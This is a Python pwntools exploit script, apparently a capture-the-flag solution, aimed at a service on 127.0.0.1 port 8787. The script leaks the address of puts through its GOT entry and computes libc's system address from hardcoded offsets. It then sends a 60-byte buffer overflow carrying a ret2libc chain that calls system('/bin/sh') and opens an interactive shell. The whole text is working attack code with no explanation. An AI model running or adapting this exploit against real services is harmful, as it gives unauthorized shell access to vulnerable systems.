#!/usr/bin/env python
from pwn import *

r = remote("127.0.0.1",8787)

puts_got = 0x0804a01c
r.recvuntil(":")
r.sendline("134520860")
r.recvuntil(": ")
puts_addr = int(r.recvuntil("\n").strip(),16)
puts_offset = 0x0005fca0
sys_offset = 0x0003ada0
sys_addr = puts_addr - puts_offset + sys_offset
sh_addr = 0x804929e
r.sendline("a"*60 + p32(sys_addr) + p32(0xdadadada)  + p32(sh_addr))
r.interactive()

